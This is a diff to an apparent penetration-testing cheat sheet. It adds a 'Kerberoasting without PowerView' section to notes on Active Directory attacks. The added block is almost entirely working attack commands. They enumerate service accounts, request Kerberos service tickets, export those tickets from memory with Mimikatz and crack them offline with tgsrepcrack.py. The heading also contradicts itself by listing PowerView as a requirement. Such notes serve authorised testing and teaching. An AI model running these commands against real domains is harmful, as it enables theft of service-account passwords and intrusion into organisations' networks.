@@ -16,6 +16,28 @@ Request-SPNTicket "<spn>" -Format Hashcat   # If this doesn't work in hashcat, a
 hashcat -m 13100 -a 0 hash.txt  /path/to/wordlist.txt
 ```
 
+## Kerberoasting without PowerView
+
+Requirements:  
+- PowerView
+- Invoke-Mimikatz.ps1 or Mimikatz.exe
+- TGSrepcrack.py
+
+```powershell
+# Find user accounts used as service accounts
+Get-NetUser -SPN
+
+# Fetching SPN ticket 
+Add-Type –AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken –ArgumentList ‘MSSQLSvc/jefflab-sql02.jefflab.local:1433’
+
+# Use Invoke-Mimikatz or Mimikatz to pull these tickets from memory
+Invoke-mimikatz -Command '"kerberos::list /export"' OR kerberos::list /export
+
+# Crack with TGSrepcrack.py
+python3 tgsrepcrack.py wordlist.txt <ticket>.kirbi
+```
+
 ## AS-REP Roasting
 
 Requitements:  
